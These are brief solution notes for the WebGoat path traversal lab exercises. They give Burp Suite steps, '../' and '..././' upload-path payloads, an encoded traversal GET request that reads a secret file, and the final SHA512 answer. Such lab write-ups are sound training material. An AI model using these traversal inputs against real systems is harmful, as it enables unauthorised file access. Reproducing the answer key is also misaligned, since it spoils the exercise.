# Path traversal

## task 2

send request, catch with burp send to repeater, make change in form data field to change upload location

```
Content-Disposition: form-data; name="fullName"

../test
```

## task 3

Same before, application remove accurences of ../, but not nested recursivly, change form-data to

```
..././test
```

## task 4

Catch request in burp and change ( line 15) test to ../test

## task 5

```
send response ( get random cat image)
```

```
catch response with burp and see that we can create get request
```

```
GET /WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret HTTP/1.1
```

```
online converter sha512
https://emn178.github.io/online-tools/sha512.html
```

```
answer:7fcf4ba391c48784edde599889d6e3f1e47a27db36ecc050cc92f259bfac38afad2c68a1ae804d77075e8fb722503f3eca2b2c1006ee6f6c7b7628cb45fffd1d
```
